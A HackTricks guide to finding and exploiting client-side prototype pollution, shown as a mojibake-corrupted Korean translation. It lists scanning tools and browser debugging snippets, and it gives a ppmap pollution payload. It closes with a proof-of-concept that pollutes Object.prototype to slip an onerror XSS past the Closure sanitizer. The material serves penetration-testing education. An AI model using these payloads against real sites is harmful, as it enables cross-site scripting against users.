# í´ë¼ì´ì–¸íŠ¸ ì¸¡ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¥¼ í†µí•´ ì œë¡œë¶€í„° ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

## ìë™ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°œê²¬í•˜ê¸°

ë„êµ¬ [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **ë°** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find)ë¥¼ ì‚¬ìš©í•˜ì—¬ **í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ì·¨ì•½ì ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

ë˜í•œ **ë¸Œë¼ìš°ì € í™•ì¥ í”„ë¡œê·¸ë¨** [**PPScan**](https://github.com/msrkp/PPScan)ì„ ì‚¬ìš©í•˜ì—¬ **ìë™ìœ¼ë¡œ** **ì•¡ì„¸ìŠ¤í•˜ëŠ” í˜ì´ì§€**ë¥¼ **ìŠ¤ìº”**í•˜ì—¬ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ì·¨ì•½ì ì„ **ìë™ìœ¼ë¡œ** ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì†ì„±ì´ ì‚¬ìš©ëœ ìœ„ì¹˜ë¥¼ ë””ë²„ê¹…í•˜ê¸° <a href="#id-5530" id="id-5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### Prototype Pollution ì›ì¸ ì°¾ê¸° <a href="#id-5530" id="id-5530"></a>

í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ì·¨ì•½ì ì´ ë„êµ¬ë¥¼ í†µí•´ ì‹ë³„ë˜ë©´ ì½”ë“œê°€ ì§€ë‚˜ì¹˜ê²Œ ë³µì¡í•˜ì§€ ì•Šë‹¤ë©´ `location.hash`, `decodeURIComponent`, ë˜ëŠ” `location.search`ì™€ ê°™ì€ í‚¤ì›Œë“œë¥¼ Chrome ê°œë°œì ë„êµ¬ì—ì„œ ê²€ìƒ‰í•˜ì—¬ ì·¨ì•½í•œ JavaScript ì½”ë“œ ë¶€ë¶„ì„ ì •í™•íˆ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë” í¬ê³  ë³µì¡í•œ ì½”ë“œë² ì´ìŠ¤ì˜ ê²½ìš° ì·¨ì•½í•œ ì½”ë“œë¥¼ ë°œê²¬í•˜ëŠ” ê°„ë‹¨í•œ ë°©ë²•ì€ ë‹¤ìŒ ë‹¨ê³„ë¥¼ ë”°ë¦…ë‹ˆë‹¤:

1. ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ì·¨ì•½ì ì„ ì‹ë³„í•˜ê³  ìƒì„±ìì— ì†ì„±ì„ ì„¤ì •í•˜ëŠ” í˜ì´ë¡œë“œë¥¼ ì–»ìŠµë‹ˆë‹¤. ppmapì—ì„œ ì œê³µí•˜ëŠ” ì˜ˆì‹œëŠ” ë‹¤ìŒê³¼ ê°™ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: `constructor[prototype][ppmap]=reserved`.
2. í˜ì´ì§€ì—ì„œ ì‹¤í–‰ë  JavaScript ì½”ë“œì˜ ì²« ì¤„ì—ì„œ ì¤‘ë‹¨ì ì„ ì„¤ì •í•©ë‹ˆë‹¤. í˜ì´ë¡œë“œë¡œ í˜ì´ì§€ë¥¼ ìƒˆë¡œ ê³ ì¹¨í•˜ì—¬ ì´ ì¤‘ë‹¨ì ì—ì„œ ì‹¤í–‰ì„ ì¼ì‹œ ì¤‘ì§€í•©ë‹ˆë‹¤.
3. JavaScript ì‹¤í–‰ì´ ì¤‘ì§€ëœ ë™ì•ˆ JS ì½˜ì†”ì—ì„œ ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” 'ppmap' ì†ì„±ì´ ìƒì„±ë  ë•Œ ì‹ í˜¸ë¥¼ ë³´ë‚´ì–´ ì›ë³¸ì„ ì°¾ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤:
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. **ì†ŒìŠ¤** íƒ­ìœ¼ë¡œ ì´ë™í•œ í›„ "ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ ê³„ì†"ì„ ì„ íƒí•©ë‹ˆë‹¤. JavaScriptëŠ” ê³„ì† ì‹¤í–‰ë˜ê³  'ppmap' ì†ì„±ì´ ì˜ˆìƒëŒ€ë¡œ ì˜¤ì—¼ë©ë‹ˆë‹¤. ì œê³µëœ ìŠ¤ë‹ˆí«ì„ í™œìš©í•˜ë©´ 'ppmap' ì†ì„±ì´ ì˜¤ì—¼ëœ ì •í™•í•œ ìœ„ì¹˜ë¥¼ ì‹ë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **í˜¸ì¶œ ìŠ¤íƒ**ì„ ì¡°ì‚¬í•˜ì—¬ ì˜¤ì—¼ì´ ë°œìƒí•œ ë‹¤ì–‘í•œ ìŠ¤íƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì¡°ì‚¬í•  ìŠ¤íƒì„ ê²°ì •í•  ë•ŒëŠ” í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì´ ìì£¼ ë°œìƒí•˜ëŠ” JavaScript ë¼ì´ë¸ŒëŸ¬ë¦¬ íŒŒì¼ê³¼ ê´€ë ¨ëœ ìŠ¤íƒì„ ëŒ€ìƒìœ¼ë¡œ í•˜ëŠ” ê²ƒì´ ìœ ìš©í•©ë‹ˆë‹¤. ë¼ì´ë¸ŒëŸ¬ë¦¬ íŒŒì¼ê³¼ ì—°ê²°ëœ ìŠ¤íƒì„ í™•ì¸í•˜ì—¬ ê´€ë ¨ ìŠ¤íƒì„ ì‹ë³„í•©ë‹ˆë‹¤(ì˜¤ë¥¸ìª½ì— í‘œì‹œë˜ëŠ” ì´ë¯¸ì§€ì™€ ìœ ì‚¬í•¨). 4ë²ˆ ì¤„ê³¼ 6ë²ˆ ì¤„ê³¼ ê°™ì´ ì—¬ëŸ¬ ìŠ¤íƒì´ ìˆëŠ” ê²½ìš°, ì˜¤ì—¼ì´ ë°œìƒí•œ ì´ˆê¸° ìŠ¤íƒì¸ 4ë²ˆ ì¤„ì˜ ìŠ¤íƒì„ ì„ íƒí•˜ëŠ” ê²ƒì´ ë…¼ë¦¬ì ì¸ ì„ íƒì…ë‹ˆë‹¤. ìŠ¤íƒì„ í´ë¦­í•˜ë©´ ì·¨ì•½í•œ ì½”ë“œë¡œ ì´ë™í•©ë‹ˆë‹¤.

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## ìŠ¤í¬ë¦½íŠ¸ ê°€ì ¯ ì°¾ê¸°

ê°€ì ¯ì€ **PP ì·¨ì•½ì ì´ ë°œê²¬ë˜ë©´ ì•…ìš©ë  ì½”ë“œ**ì…ë‹ˆë‹¤.

ì‘ìš© í”„ë¡œê·¸ë¨ì´ ê°„ë‹¨í•œ ê²½ìš° **`srcdoc/innerHTML/iframe/createElement`**ê³¼ ê°™ì€ **í‚¤ì›Œë“œ**ë¥¼ **ê²€ìƒ‰**í•˜ì—¬ ì†ŒìŠ¤ ì½”ë“œë¥¼ ê²€í† í•˜ê³  **ìë°”ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ìœ¼ë¡œ ì´ì–´ì§€ëŠ”ì§€** í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë•Œë¡œëŠ” ì–¸ê¸‰ëœ ê¸°ìˆ ì´ ê°€ì ¯ì„ ì°¾ì§€ ëª»í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê²½ìš° ìˆœìˆ˜í•œ ì†ŒìŠ¤ ì½”ë“œ ê²€í† ë¥¼ í†µí•´ ì•„ë˜ ì˜ˆì œì™€ ê°™ì´ ì¢‹ì€ ê°€ì ¯ì„ ë°œê²¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Mithil ë¼ì´ë¸ŒëŸ¬ë¦¬ ì½”ë“œì—ì„œ PP ê°€ì ¯ ì°¾ê¸° ì˜ˆì œ

ë‹¤ìŒ ê¸€ì„ í™•ì¸í•˜ì„¸ìš”: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## ì·¨ì•½í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ìš© í˜ì´ë¡œë“œ ì¬ì»´íŒŒì¼

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## PPë¥¼ í†µí•œ HTML ì‚°ì—…í™” ìš°íšŒ

[**ì´ ì—°êµ¬**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)ëŠ” ì¼ë¶€ HTML ì‚°ì—…í™” ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ì œê³µë˜ëŠ” ì‚°ì—…í™”ë¥¼ **ìš°íšŒí•˜ëŠ” ë° ì‚¬ìš©í•  PP ê°€ì ¯**ì„ ë³´ì—¬ì¤ë‹ˆë‹¤:

* **sanitize-html**

<figure><img src="../../../.gitbook/assets/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* **dompurify**

<figure><img src="../../../.gitbook/assets/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## ì°¸ê³  ìë£Œ

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ PDFë¡œ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ë‹¤ë©´** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì´ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
